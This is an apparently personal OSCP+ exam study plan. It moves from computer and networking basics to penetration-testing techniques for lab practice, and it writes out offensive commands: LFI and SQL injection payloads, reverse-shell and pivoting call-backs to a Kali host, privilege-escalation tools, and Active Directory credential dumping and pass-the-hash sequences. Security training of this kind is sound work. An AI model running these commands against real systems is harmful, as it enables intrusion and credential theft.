Chapter 00

Chapter Zero: How Computers & Networks Actually Work

Written specifically for your brother starting from zero IT background. Read and discuss these four mental models together before starting Week 1. Once you can picture how an operating system and network operate under the hood, every command in this book makes intuitive sense.

Mental Model 1: Hardware, The Kernel, and User Space

Think of a computer like a high-security bank. At the center is the Hardware (CPU, RAM, Hard Disk)—the physical vault. Surrounding the hardware is the Kernel—the bank manager who holds absolute control over the machine. Surrounding the Kernel is User Space—the public lobby where normal programs (like a web browser or a web server) run.

Every program runs under a specific User Account. Normal accounts (like www-data on Linux or iis apppool\defaultapppool on Windows) are severely restricted by the Kernel so they cannot read sensitive files or change system settings. At the top sits the superuser account—called root (User ID 0) on Linux, and NT AUTHORITY\SYSTEM on Windows.

What is Privilege Escalation? When you first gain access to a target server through a vulnerable website, your terminal session inherits the low permissions of that website's user account (worth 10 points on the exam). Privilege Escalation (worth the second 10 points) is the process of auditing the computer to find a misconfigured script, scheduled task, or system service that runs with superuser authority, allowing you to step up from a low-privilege account to `root` or `SYSTEM`.

Mental Model 2: IP Addresses, Ports, and Network Services

Every computer on a network has an IP Address (like 192.168.45.120), which acts like the street address of an apartment building. Inside that computer are 65,535 numbered Ports (numbered `1` to `65535`), which act like individual apartment doors.

An open port means a Service (or Daemon)—a background program—is sitting behind that door waiting to talk to other computers over the network:
• Port 22 (SSH): Remote encrypted command-line login for Linux (and sometimes Windows).
• Port 80 (HTTP) & Port 443 (HTTPS): Web servers (Apache, Nginx, Microsoft IIS) serving websites and APIs.
• Port 139 & Port 445 (SMB): Windows File and Printer Sharing.
• Port 3389 (RDP) & Port 5985 (WinRM): Windows Remote Desktop (graphical) and Windows Remote Management (command line).

When we run a port scanner like Nmap, we are simply knocking on all 65,535 doors to discover which services are listening and what software versions they are running.

Mental Model 3: What Is a "Shell" (Bind vs. Reverse)?

A Shell (such as `bash` on Linux, or `cmd.exe` and `powershell.exe` on Windows) is simply a text interpreter: you type a command, the OS runs it, and it prints the text output back to you.

When you assess a remote server and discover a vulnerability that allows command execution, you need a way to interact with that server's shell over the network:
• Bind Shell: You tell the target server to open a new listening port, and your Kali machine connects inward to it. (Often blocked by incoming firewalls).
• Reverse Shell: You open a listening port on your Kali machine (`rlwrap nc -lvnp 443`), and you instruct the target server to connect outward back to your Kali IP. Because firewalls usually allow outbound traffic on common ports like 80 or 443, reverse shells are standard practice.

Mental Model 4: What Is Active Directory (AD)?

In a home setup, each computer keeps its own local list of usernames and passwords. In a company with 500 computers, managing accounts locally on each machine would be impossible. Instead, companies use Microsoft Active Directory (AD).

In an AD network (called a Domain), a central server called the Domain Controller (DC) holds the master database (`NTDS.dit`) of every employee's username, password hash, and permissions. When an employee sits down at Workstation #1 or Server #2 and logs in, that machine asks the Domain Controller: "Is this user who they say they are, and are they allowed to access this computer?" Compromising the Domain Controller gives an auditor administrative authority over every computer joined to that domain.

2.1 Scoring Breakdown (70 Points to Pass)

  • 1 Active Directory Set (40 Points Total — Assumed Breach): Consists of 2 domain clients/servers and 1 Domain Controller. You are given a valid standard domain user's username and password at the start of the exam. Partial points are awarded: 10 points for Machine 1, 10 points for Machine 2, and 20 points for the Domain Controller.
  • 3 Standalone Machines (60 Points Total — 20 Points Each): Each machine awards 10 points for initial low-privilege access (`local.txt`) and 10 points for privilege escalation to `root` or `SYSTEM` (`proof.txt`).
  • Zero Bonus Points: Lab exercises no longer grant bonus points. To reach 70 points, your highest-probability path is: Full AD Set (40 pts) + 1 Full Standalone (20 pts) + 1 Standalone Initial Access (10 pts) = 70 pts.
  • Time Allocation: 23 hours and 45 minutes of VPN exam access, followed by 24 hours to submit your professional PDF report.
Strict Exam Prohibitions (Verify on help.offsec.com Before Booking)
  • Zero AI Usage: Any use of AI chatbots, LLMs (ChatGPT, Claude, Gemini, Copilot, local Ollama models), or browser AI extensions during the exam is strictly prohibited and results in immediate revocation.
  • Banned Scanners & Exploit Tools: Automated exploitation tools (`sqlmap`), mass commercial/automated vulnerability scanners (`Nessus`, `OpenVAS`, `Acunetix`), and `Burp Suite Pro` Active Scanner are forbidden.
  • Single-Target Metasploit Limit: You may use Metasploit exploit/post modules and the `Meterpreter` payload against **only one (1) single target machine** during the entire exam. Using `msfvenom` to generate standard non-Meterpreter shells or using `multi/handler` to catch standard reverse shells is permitted on all machines.
  • No Spoofing/Poisoning: LLMNR/NBT-NS poisoning (`Responder`) and ARP spoofing are prohibited.

Week 1

Linux Fundamentals I: Filesystem, Users & Permissions

Navigate any Linux server blind via terminal, read/edit files, and decode rwx permission bits.
First Principles: The Linux Directory Tree & Permissions

Unlike Windows (`C:\`), Linux starts at the root slash (`/`). Key folders you will inspect on every target:
• /etc: System configuration files (`passwd` lists users, `shadow` holds password hashes, `crontab` lists scheduled tasks, `sudoers` defines admin rights).
• /var/www: Default location for web server files and database configuration scripts.
• /tmp and /dev/shm: World-writable folders where any low-privilege user can download and execute diagnostic scripts.
When you run ls -la, you see strings like -rwxr-xr-- 1 root www-data. The first character (`-` for file, `d` for directory) is followed by three sets of Read (r=4), Write (w=2), and Execute (x=1) permissions for the User owner (`rwx` = 7), the Group owner (`r-x` = 5), and Others (`r--` = 4).

Mon/Wed/Fri (2h each): Complete the Grasshopper track and start Novice on Linux Journey.

Weekend (4–6h): Complete OverTheWire Bandit Levels 0–10 via SSH (`ssh bandit0@bandit.labs.overthewire.org -p 2220`). Never search for solutions—use the command manual pages (`man find`, `man file`).

Week 2

Linux Fundamentals II: Processes, Cron, Pipes & Redirection

Chain commands with pipes, suppress errors, inspect running processes, and understand scheduled tasks.
First Principles: Standard Streams (STDIN, STDOUT, STDERR)

Every Linux command has three data streams: 0 (Standard Input), 1 (Standard Output), and 2 (Standard Error).
• The pipe symbol (|) sends the output of Command A directly into the input of Command B (e.g., ps aux | grep root).
• Appending 2>/dev/null redirects all "Permission denied" error messages (Stream 2) into the virtual trash bin (`/dev/null`) so you only see clean results when searching the entire hard drive.

Mon/Wed/Fri: Finish Novice and complete the Journeyman track on Linux Journey (processes, packages, network files, cron).

Weekend: Complete Bandit Levels 10–20 (base64, hex, compression, SSH private keys, and `nc` connections).

Week 3

Networking I: OSI/TCP Models, IP Addressing & Subnetting

Trace how packets move across networks and calculate CIDR subnets (/24, /16, /26) by hand.
First Principles: TCP Handshakes & Subnet Masks

Before two computers exchange data over TCP, they complete a three-step handshake: the client sends a SYN packet, the server replies with SYN-ACK if the port is open (or RST if closed), and the client replies with ACK.
A Subnet Mask (like `/24` or `255.255.255.0`) defines how many IP addresses live inside a local neighborhood. A `/24` network has $2^{32-24} = 256$ total addresses (`254` usable hosts from `.1` to `.254`). On the OSCP exam, when you compromise a dual-homed server and see an interface with `172.16.50.10/24`, you immediately know there are up to 253 other potential hosts (`172.16.50.1` to `.254`) hiding on that internal network.

Mon/Wed/Fri: TryHackMe free networking rooms (What is Networking, Intro to LAN) and Professor Messer's Network+ N10-009 OSI, TCP/IP, and Subnetting videos.

Weekend: Drill subnetting on `subnetting.net` or `subnetting-questions.com` until both brothers can split a `/24` into 4 equal `/26` subnets on paper in under 2 minutes.

Week 6

Web Application Basics & Burp Suite Proxy

Read raw HTTP requests and responses, understand methods/headers/cookies, and intercept traffic with Burp Suite Community.
First Principles: HTTP Requests, Headers, and Cookies

The web is stateless—every time you click a link, your browser sends a plain-text HTTP Request to the server (`GET /profile.php HTTP/1.1` or `POST /login.php HTTP/1.1`). Because HTTP forgets who you are between clicks, the server issues a Session Cookie (`Cookie: PHPSESSID=xyz123`) in the HTTP headers. By placing Burp Suite between your browser and the server, you can pause any request mid-flight and modify hidden form fields, cookies, or headers before the server sees them.

Mon/Wed/Fri: Complete TryHackMe's How the Web Works and Burp Suite: The Basics rooms, plus PortSwigger Academy's introductory HTTP pages.

Weeks 13–14

Information Gathering, Service Enumeration & Report Writing

PEN-200 Modules: Report Writing, Information Gathering, Vulnerability Scanning.

What to Master & Drill:

  • 3-Stage Nmap Routine: Fast all-ports TCP scan (`-p- --min-rate 3000`), targeted version/script scan (`-p -sC -sV -O`), and UDP top-ports scan (`-sU --top-ports 100`).
  • Protocol Enumeration:
    • DNS (Port 53): Zone transfers (`dig axfr @$IP domain.local`) and subdomain brute-forcing (`ffuf`).
    • SMB (Ports 139/445): Null sessions and guest share enumeration using NetExec (`nxc smb $IP -u '' -p '' --shares`), `smbclient -N -L //$IP`, and `enum4linux-ng`.
    • SNMP (UDP 161): Community string brute-forcing (`onesixtyone`) and walking the process/software MIB trees (`snmpwalk -v2c -c public $IP`).
    • NFS (Port 2049) & SMTP (Port 25): Listing exported mounts (`showmount -e $IP`) and verifying mail users.
  • Vulnerability Scanning Theory: Understand how authenticated vs. unauthenticated scanners work conceptually, while remembering that automated scanners like Nessus are banned on the OSCP+ exam.

Deliverable: Create `01_Port_Enumeration_By_Service.md` in Obsidian containing your exact copy-pasteable commands for every port above, and download OffSec's official OSCP Report Template.

Weeks 15–18

Web Application Attacks & Manual SQL Injection

PEN-200 Modules: Intro to Web App Attacks, Common Web App Attacks (Parts 1 & 2), SQL Injection Attacks.
Textbook Concept: Turning Web Flaws into System Shells

• Week 15 (Burp Suite, IDOR & APIs): Inspecting source code, HTTP headers, verb tampering, and Insecure Direct Object References (changing `/api/user/102` to `/api/user/1` or `/api/admin`).
• Week 16 (Directory Traversal & LFI): Stepping out of the web root (`../../../../etc/passwd`), using PHP stream wrappers (`php://filter/convert.base64-encode/resource=index.php`) to read backend source code without executing it, and Log Poisoning (injecting PHP code inside your `User-Agent` HTTP header and including `/var/log/apache2/access.log` via LFI to gain remote code execution).
• Week 17 (RFI, File Uploads & OS Command Injection): Bypassing upload filters via alternative executable extensions (`.phtml`, `.phar`, `.aspx`), `Content-Type` header manipulation, and magic bytes (`GIF89a;`), plus direct and blind OS command injection (`;`, `|`, `&&`).
• Week 18 (Manual SQL Injection — Zero `sqlmap`!): Because `sqlmap` is strictly banned on the OSCP+ exam, you must master manual SQL injection across MySQL, MSSQL, and PostgreSQL: finding column counts with `ORDER BY`, extracting database schemas from `information_schema.tables` via `UNION SELECT`, reading/writing files in MySQL (`LOAD_FILE()`, `INTO OUTFILE`), and enabling `xp_cmdshell` on Microsoft SQL Server (`impacket-mssqlclient`).

Week 19

Password Attacks, Locating Public Exploits & Fixing Exploits

PEN-200 Modules: Password Attacks, Locating Public Exploits, Fixing Exploits.

What to Master & Drill:

  • Network Login Auditing: Auditing SSH, FTP, RDP, and HTTP POST forms using `Hydra` and Burp Intruder, while avoiding account lockouts.
  • Offline Hash Cracking: Identifying hash formats (`hashid` and Hashcat's example table) and cracking MD5, Linux SHA-512/yescrypt, Windows NTLM (`-m 1000`), and Net-NTLMv2 (`-m 5600`) using `rockyou.txt` and Hashcat rules (`best64.rule`).
  • Adapting Broken Public Exploits: Searching offline Exploit-DB (`searchsploit`), reading proof-of-concept source code before execution, fixing hardcoded URLs/ports/shellcode, converting Python 2 scripts to Python 3, and cross-compiling Windows C exploits on Kali (`x86_64-w64-mingw32-gcc exploit.c -o exploit.exe -lws2_32`).

Phase 1B

Linux & Windows Privilege Escalation (Weeks 20–23)

Initial access is only 10 points. Privilege escalation gives you the second 10 points on standalone boxes and unlocks credential dumping on Active Directory machines. Enforce the 2h/3h cap on all practice boxes.

Weeks 20–21

Linux Privilege Escalation

PEN-200 Module: Linux Privilege Escalation.
  1. Manual Audit First: Always check `id`, `sudo -l` (check every allowed binary on GTFOBins, plus `LD_PRELOAD` / `env_keep`), `/etc/passwd` permissions, history files, and hidden SSH keys before running any automated tool.
  2. SUID/SGID & Linux Capabilities: Locate SUID binaries (`find / -perm -4000 2>/dev/null`) and file capabilities (`getcap -r / 2>/dev/null`) such as `cap_setuid+ep` on Python or Perl.
  3. Cron Jobs & Process Monitoring (`pspy64`): Inspect `/etc/crontab` and `/etc/cron.d/`, then run `pspy64` to watch root processes (UID=0) executing in real time. Look for writable scripts, relative paths (PATH hijacking), or wildcard expansion (`tar *`).
  4. Internal Services & Automated Scripts: Check `ss -tulpn` for services bound to `127.0.0.1` running as root, then run `LinPEAS` (`linpeas.sh`) to verify nothing was missed.

Practice: Complete TryHackMe's Linux PrivEsc and Linux PrivEsc Arena rooms, then intentionally configure a vulnerable SUID binary, cron job, and sudo rule on your local Linux VM and audit them yourself. Root 2 free Linux boxes on Proving Grounds Play (3-hour cap per box).

References: GTFOBins · HackTricks Linux PrivEsc · OffSec Recordings: OSA-PEN-200 Weeks 4A–6A Privilege Escalation
Weeks 22–23

Windows Privilege Escalation (Modern Server 2019/2022 Tooling)

PEN-200 Module: Windows Privilege Escalation.
  1. Token Privileges (`whoami /priv`):
    • If `SeImpersonatePrivilege` or `SeAssignPrimaryTokenPrivilege` is Enabled (standard on IIS web shells and SQL service accounts): In addition to understanding legacy Juicy/RoguePotato concepts, drill modern tools that work on Windows 10/11 and Server 2019/2022: GodPotato (`GodPotato-NET4.exe -cmd "nc64.exe ..."`) and PrintSpoofer (`PrintSpoofer64.exe -i -c powershell.exe`).
    • If `SeBackupPrivilege` is Enabled: Save the `HKLM\SAM` and `HKLM\SYSTEM` registry hives (`reg save HKLM\SAM sam.save`) and extract the local Administrator NTLM hash with `impacket-secretsdump`.
  2. Service Misconfigurations: Audit Windows services using `WinPEASx64.exe`, `SharpUp.exe`, and native `icacls` / `sc.exe`:
    • Weak Service Binary Permissions: Replace the writable `.exe` with a reverse shell binary and restart the service (`sc.exe stop/start`).
    • Weak Service ACLs: Reconfigure `binPath=` via `sc.exe config`.
    • Unquoted Service Paths and DLL Hijacking (planting a malicious DLL in a writable directory along the Windows DLL search order).
  3. Scheduled Tasks & Stored Credentials: Inspect PowerShell command history (`ConsoleHost_history.txt`), `Unattend.xml`, `cmdkey /list`, and registry AutoLogon keys. When you find valid credentials for another local or domain user, use `RunasCs.exe` (`RunasCs.exe user pass "cmd"`) to execute commands cleanly from a non-interactive web or reverse shell.

Client-Side Vectors, AV Mechanics, Tunneling/Pivoting & Metasploit

Week 24 (Client-Side & AV Detection Mechanics): Study how client-side document vectors work (Microsoft Office VBA macros and Windows `.library-ms` virtual folders pointing to WebDAV shares) and how antivirus engines detect payloads (static byte signatures vs. heuristic analysis vs. dynamic runtime monitoring/AMSI). Master both classic SSH tunneling (`ssh -L` local port forward, `ssh -D` dynamic SOCKS proxy, `ssh -R` remote port forward, `chisel`) AND modern TUN interface routing with Ligolo-ng:

# Ligolo-ng Fast Pivoting Workflow (No proxychains slowdown!) # 1. On Kali: Create virtual interface and start proxy server sudo ip tuntap add user $(whoami) mode tun ligolo && sudo ip link set ligolo up ./proxy -selfcert -laddr 0.0.0.0:11601 # 2. On Pivot Host: Connect agent back to Kali ./agent.exe -connect <KALI_IP>:11601 -ignore-cert # 3. On Kali: Add internal subnet route (e.g., 172.16.50.0/24) and start tunnel in Ligolo console sudo ip route add 172.16.50.0/24 dev ligolo

Weeks 27–30

Active Directory Mastery (40% of the OSCP+ Exam)

PEN-200 Modules: AD Introduction & Enumeration, Attacking AD Authentication, Lateral Movement in AD.
Assumed-Breach Exam Alignment & RAM Sizing
On the OSCP+ exam, you start the AD set with a valid low-privilege domain username and password. Train that exact starting point against your local 2-VM BadBlood Domain Lab / GOAD-Mini (if your host has 16 GB RAM) or GOAD-Light / Full GOAD (only if your host has 24–32 GB+ RAM).

Week 27 — Domain Enumeration & BloodHound: Start from your standard domain user account. Test credentials across all domain machines using NetExec (`nxc smb/winrm/mssql`), enumerate shares and users, and collect domain graph data using `bloodhound-python` (remotely from Kali) or `SharpHound.exe` (from a domain-joined Windows host). In BloodHound, mark your starting user as Owned and analyze shortest paths, group delegations, and ACL permissions (`ForceChangePassword`, `GenericAll`, `GenericWrite`, `WriteDacl`).

Week 28 — AD Authentication & Password Spraying: Understand NTLM challenge-response vs. Kerberos ticket exchanges (KDC, TGT, TGS), where Windows stores credentials in memory and registry (`LSASS`, `SAM`, `LSA Secrets`, `NTDS.dit`), and how to safely spray a discovered password across domain accounts using NetExec (`nxc smb $DC_IP -u users.txt -p 'Password123' --continue-on-success`).

Week 29 — Kerberos & ACL Attacks: Synchronize your Kali clock with the Domain Controller (`sudo ntpdate $DC_IP`) and practice:
• AS-REP Roasting (`impacket-GetNPUsers`): Requesting TGTs for accounts with pre-authentication disabled and cracking with Hashcat mode `18200`.
• Kerberoasting (`impacket-GetUserSPNs`): Requesting service tickets (TGS) for accounts with Service Principal Names (SPNs) and cracking offline with Hashcat mode `13100`.
• Object ACL Abuse (`bloodyAD` / `net rpc`): Resetting passwords or performing targeted Kerberoasting when your user holds `GenericAll` or `GenericWrite` over another object.
• Silver Tickets & DCSync (`impacket-secretsdump`): Understanding ticket forging and domain replication abuse.

Week 30 — Post-Compromise Dumping & Lateral Movement: Whenever you gain Administrator/SYSTEM on Machine 1 or Machine 2, dump local SAM hashes, LSA secrets, and LSASS memory (`impacket-secretsdump` or `nxc smb ... --lsa`). Practice moving laterally to the next machine using:
• Pass-the-Hash (`evil-winrm -H`, `impacket-wmiexec -hashes`, `impacket-psexec -hashes`)
• Overpass-the-Hash / Pass-the-Ticket (`Rubeus.exe`, `export KRB5CCNAME=...`)
• WMI, WinRM, DCOM, and Volume Shadow Copy (`vssadmin` / `diskshadow`) extraction of `NTDS.dit`.

# Core Assumed-Breach AD Command Sequence nxc smb 192.168.50.0/24 -u 'user1' -p 'Pass123' --shares bloodhound-python -d corp.local -u 'user1' -p 'Pass123' -ns $DC_IP -c All --zip impacket-GetNPUsers corp.local/user1:'Pass123' -dc-ip $DC_IP -request -outputfile asrep.txt impacket-GetUserSPNs corp.local/user1:'Pass123' -dc-ip $DC_IP -request -outputfile kerberoast.txt impacket-secretsdump corp.local/admin_user:'Pass123'@$TARGET_IP evil-winrm -i $TARGET_IP -u Administrator -H <NTLM_HASH>
